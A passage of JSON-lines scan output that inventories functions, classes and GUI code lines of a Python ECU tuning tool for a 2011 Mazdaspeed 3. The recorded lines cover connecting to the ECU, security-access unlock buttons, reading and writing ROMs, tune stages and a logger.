text=\"Security Access\", padding=10)"}, {"type": "hardware", "line": 103, "hardware": "ECU", "content": "security_frame.pack(fill=tk.X, padx=5, pady=5)"}, {"type": "hardware", "line": 105, "hardware": "ECU", "content": "ttk.Button(security_frame, text=\"Unlock ECU (Level 1)\","}, {"type": "hardware", "line": 106, "hardware": "ECU", "content": "command=lambda: self._unlock_ecu(1)).grid(row=0, column=0, padx=5)"}, {"type": "hardware", "line": 107, "hardware": "ECU", "content": "ttk.Button(security_frame, text=\"Unlock ECU (Level 3)\","}, {"type": "hardware", "line": 108, "hardware": "ECU", "content": "command=lambda: self._unlock_ecu(3)).grid(row=0, column=1, padx=5)"}, {"type": "hardware", "line": 109, "hardware": "ECU", "content": "ttk.Button(security_frame, text=\"Enter Programming Mode\","}, {"type": "hardware", "line": 112, "hardware": "ECU", "content": "self.security_status_var = tk.StringVar(value=\"Security: Not Unlocked\")"}, {"type": "hardware", "line": 113, "hardware": "ECU", "content": "ttk.Label(security_frame, textvariable=self.security_status_var).grid(row=1, column=0, columnspan=3,"}, {"type": "hardware", "line": 267, "hardware": "ECU", "content": "\"\"\"Create ECU flashing tab\"\"\""}, {"type": "hardware", "line": 285, "hardware": "ECU", "content": "flash_control_frame = ttk.LabelFrame(flash_frame, text=\"ECU Flashing\")"}, {"type": "hardware", "line": 288, "hardware": "ECU", "content": "ttk.Button(flash_control_frame, text=\"Write ROM to ECU\","}, {"type": "hardware", "line": 322, "hardware": "vehicle", "content": "vehicle_frame = ttk.LabelFrame(settings_frame, text=\"Vehicle Settings\")"}, {"type": "hardware", "line": 323, "hardware": "vehicle", "content": "vehicle_frame.pack(fill=tk.X, padx=5, pady=5)"}, {"type": "hardware", "line": 325, "hardware": "vehicle", "content": "ttk.Label(vehicle_frame, text=\"Vehicle Model:\").grid(row=0, column=0, sticky=tk.W)"}, {"type": "hardware", "line": 326, "hardware": "vehicle", "content": "self.vehicle_model_var = tk.StringVar(value=\"Mazdaspeed 3 2011\")"}, {"type": "hardware", "line": 327, "hardware": "vehicle", "content": "ttk.Label(vehicle_frame, textvariable=self.vehicle_model_var).grid(row=0, column=1, sticky=tk.W)"}, {"type": "hardware", "line": 329, "hardware": "ECU", "content": "ttk.Label(vehicle_frame, text=\"ECU Type:\").grid(row=1, column=0, sticky=tk.W)"}, {"type": "hardware", "line": 329, "hardware": "vehicle", "content": "ttk.Label(vehicle_frame, text=\"ECU Type:\").grid(row=1, column=0, sticky=tk.W)"}, {"type": "hardware", "line": 330, "hardware": "ECU", "content": "self.ecu_type_var = tk.StringVar(value=\"MZR 2.3L DISI TURBO\")"}, {"type": "hardware", "line": 331, "hardware": "ECU", "content": "ttk.Label(vehicle_frame, textvariable=self.ecu_type_var).grid(row=1, column=1, sticky=tk.W)"}, {"type": "hardware", "line": 331, "hardware": "vehicle", "content": "ttk.Label(vehicle_frame, textvariable=self.ecu_type_var).grid(row=1, column=1, sticky=tk.W)"}, {"type": "hardware", "line": 360, "hardware": "ECU", "content": "def _connect_ecu(self):"}, {"type": "hardware", "line": 361, "hardware": "ECU", "content": "\"\"\"Connect to ECU\"\"\""}, {"type": "hardware", "line": 364, "hardware": "ECU", "content": "self.ecu_comm.interface = interface"}, {"type": "hardware", "line": 366, "hardware": "ECU", "content": "if self.ecu_comm.connect():"}, {"type": "hardware", "line": 375, "hardware": "ECU", "content": "\"\"\"Handle successful ECU connection\"\"\""}, {"type": "hardware", "line": 376, "hardware": "ECU", "content": "self.status_var.set(\"Connected to ECU\")"}, {"type": "hardware", "line": 377, "hardware": "ECU", "content": "messagebox.showinfo(\"Success\", \"Successfully connected to ECU\")"}, {"type": "hardware", "line": 380, "hardware": "vehicle", "content": "self._update_vehicle_info()"}, {"type": "hardware", "line": 383, "hardware": "ECU", "content": "\"\"\"Handle failed ECU connection\"\"\""}, {"type": "hardware", "line": 384, "hardware": "ECU", "content": "messagebox.showerror(\"Error\", \"Failed to connect to ECU. Check interface and connection.\")"}, {"type": "hardware", "line": 386, "hardware": "ECU", "content": "def _disconnect_ecu(self):"}, {"type": "hardware", "line": 387, "hardware": "ECU", "content": "\"\"\"Disconnect from ECU\"\"\""}, {"type": "hardware", "line": 388, "hardware": "ECU", "content": "self.ecu_comm.disconnect()"}, {"type": "hardware", "line": 391, "hardware": "ECU", "content": "messagebox.showinfo(\"Disconnected\", \"Disconnected from ECU\")"}, {"type": "hardware", "line": 393, "hardware": "vehicle", "content": "def _update_vehicle_info(self):"}, {"type": "hardware", "line": 394, "hardware": "vehicle", "content": "\"\"\"Update vehicle information display\"\"\""}, {"type": "hardware", "line": 398, "hardware": "ECU", "content": "info = self.rom_ops.read_ecu_info()"}, {"type": "hardware", "line": 400, "hardware": "ECU", "content": "info_text += f\"ECU Part Number: {info.get('ecu_part_number', 'Unknown')}\\n\""}, {"type": "hardware", "line": 404, "hardware": "vehicle", "content": "self.vehicle_info_text.delete(1.0, tk.END)"}, {"type": "hardware", "line": 405, "hardware": "vehicle", "content": "self.vehicle_info_text.insert(1.0, info_text)"}, {"type": "hardware", "line": 407, "hardware": "ECU", "content": "def _unlock_ecu(self, level):"}, {"type": "hardware", "line": 408, "hardware": "ECU", "content": "\"\"\"Unlock ECU security access\"\"\""}, {"type": "hardware", "line": 410, "hardware": "ECU", "content": "messagebox.showerror(\"Error\", \"Not connected to ECU\")"}, {"type": "hardware", "line": 413, "hardware": "ECU", "content": "success = self.security_mgr.unlock_ecu(level)"}, {"type": "hardware", "line": 415, "hardware": "ECU", "content": "status = self.security_mgr.check_security_status()"}, {"type": "hardware", "line": 416, "hardware": "ECU", "content": "self.security_status_var.set(f\"Security: Level {status['current_level']} - {status['level_descriptio"}, {"type": "hardware", "line": 417, "hardware": "ECU", "content": "messagebox.showinfo(\"Success\", f\"Security level {level} unlocked\")"}, {"type": "hardware", "line": 419, "hardware": "ECU", "content": "messagebox.showerror(\"Error\", \"Failed to unlock ECU security\")"}, {"type": "hardware", "line": 422, "hardware": "ECU", "content": "\"\"\"Enter ECU programming mode\"\"\""}, {"type": "hardware", "line": 424, "hardware": "ECU", "content": "messagebox.showerror(\"Error\", \"Not connected to ECU\")"}, {"type": "hardware", "line": 427, "hardware": "ECU", "content": "success = self.security_mgr.enter_programming_mode()"}, {"type": "hardware", "line": 531, "hardware": "ECU", "content": "messagebox.showerror(\"Error\", \"Not connected to ECU\")"}, {"type": "hardware", "line": 534, "hardware": "ECU", "content": "dtcs = self.ecu_comm.read_dtcs()"}, {"type": "hardware", "line": 549, "hardware": "ECU", "content": "messagebox.showerror(\"Error\", \"Not connected to ECU\")"}, {"type": "hardware", "line": 552, "hardware": "ECU", "content": "success = self.ecu_comm.clear_dtcs()"}, {"type": "hardware", "line": 570, "hardware": "ECU", "content": "\"\"\"Read ROM from ECU\"\"\""}, {"type": "hardware", "line": 572, "hardware": "ECU", "content": "messagebox.showerror(\"Error\", \"Not connected to ECU\")"}, {"type": "hardware", "line": 576, "hardware": "ECU", "content": "self.flash_status_var.set(\"Reading ROM from ECU...\")"}, {"type": "hardware", "line": 650, "hardware": "ECU", "content": "\"\"\"Write ROM to ECU\"\"\""}, {"type": "hardware", "line": 656, "hardware": "ECU", "content": "messagebox.showerror(\"Error\", \"Not connected to ECU\")"}, {"type": "hardware", "line": 660, "hardware": "ECU", "content": "if not messagebox.askyesno(\"Confirm\", \"This will overwrite the ECU ROM. Continue?\"):"}, {"type": "hardware", "line": 664, "hardware": "ECU", "content": "self.flash_status_var.set(\"Writing ROM to ECU...\")"}, {"type": "hardware", "line": 680, "hardware": "ECU", "content": "messagebox.showinfo(\"Success\", \"ROM written to ECU successfully\")"}, {"type": "hardware", "line": 683, "hardware": "ECU", "content": "messagebox.showerror(\"Error\", \"Failed to write ROM to ECU\")"}], "security_logic": [{"type": "security_pattern", "line": 13, "pattern": "security_access", "content": "from ..core.security_access import SecurityManager"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
{"file_path": "versa8.py", "lines_read": 328, "features_found": [{"type": "function", "name": "__init__", "line": 38}, {"type": "function", "name": "_load_ecu_calibrations", "line": 45}, {"type": "function", "name": "_get_supported_features", "line": 73}, {"type": "function", "name": "get_vehicle_info", "line": 88}, {"type": "function", "name": "validate_tune_parameters", "line": 111}, {"type": "function", "name": "calculate_safe_power_gains", "line": 161}, {"type": "function", "name": "get_recommended_tunes", "line": 205}, {"type": "function", "name": "_get_stage1_tune", "line": 227}, {"type": "function", "name": "_get_stage2_tune", "line": 241}, {"type": "function", "name": "_get_stage3_tune", "line": 255}, {"type": "function", "name": "_get_custom_tune", "line": 269}, {"type": "function", "name": "get_maintenance_schedule", "line": 284}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "..utils.logger", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "VersaLogger", "line": null}], "components_found": [{"type": "class", "name": "EngineSpecs", "line": 12}, {"type": "class", "name": "PerformanceLimits", "line": 23}, {"type": "class", "name": "Mazdaspeed32011", "line": 32}], "algorithms": [{"type": "algorithm_function", "line": 161, "content": "def calculate_safe_power_gains(self, modifications: List[str]) -> Dict[str, float]:"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 4, "hardware": "vehicle", "content": "Vehicle-specific parameters and configurations reverse engineered from factory data"}, {"type": "hardware", "line": 34, "hardware": "vehicle", "content": "Mazdaspeed 3 2011 vehicle-specific implementation"}, {"type": "hardware", "line": 35, "hardware": "vehicle", "content": "Contains all vehicle-specific parameters and configurations"}, {"type": "hardware", "line": 42, "hardware": "ECU", "content": "self.ecu_calibrations = self._load_ecu_calibrations()"}, {"type": "hardware", "line": 45, "hardware": "ECU", "content": "def _load_ecu_calibrations(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 46, "hardware": "ECU", "content": "\"\"\"Load vehicle-specific ECU calibration data\"\"\""}, {"type": "hardware", "line": 46, "hardware": "vehicle", "content": "\"\"\"Load vehicle-specific ECU calibration data\"\"\""}, {"type": "hardware", "line": 74, "hardware": "vehicle", "content": "\"\"\"Get supported tuning features for this vehicle\"\"\""}, {"type": "hardware", "line": 88, "hardware": "vehicle", "content": "def get_vehicle_info(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 89, "hardware": "vehicle", "content": "\"\"\"Get comprehensive vehicle information\"\"\""}, {"type": "hardware", "line": 113, "hardware": "vehicle", "content": "Validate tuning parameters against vehicle limits"}, {"type": "hardware", "line": 171, "hardware": "ECU", "content": "base_hp = self.ecu_calibrations['stock_power']['horsepower']"}, {"type": "hardware", "line": 172, "hardware": "ECU", "content": "base_torque = self.ecu_calibrations['stock_power']['torque']"}, {"type": "hardware", "line": 215, "hardware": "ECU", "content": "base_hp = self.ecu_calibrations['stock_power']['horsepower']"}, {"type": "hardware", "line": 286, "hardware": "vehicle", "content": "Get vehicle maintenance schedule based on mileage"}, {"type": "hardware", "line": 289, "hardware": "vehicle", "content": "mileage: Current vehicle mileage"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
{"file_path": "versa9.py", "lines_read": 105, "features_found": [{"type": "function", "name": "setup_application_logger", "line": 95}, {"type": "function", "name": "__init__", "line": 19}, {"type": "function", "name": "_setup_handlers", "line": 37}, {"type": "function", "name": "_get_log_directory", "line": 64}, {"type": "function", "name": "debug", "line": 70}, {"type": "function", "name": "info", "line": 74}, {"type": "function", "name": "warning", "line": 78}, {"type": "function", "name": "error", "line": 82}, {"type": "function", "name": "critical", "line": 86}, {"type": "function", "name": "exception", "line": 90}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "logging.handlers", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "Optional", "line": null}], "components_found": [{"type": "class", "name": "VersaLogger", "line": 14}], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
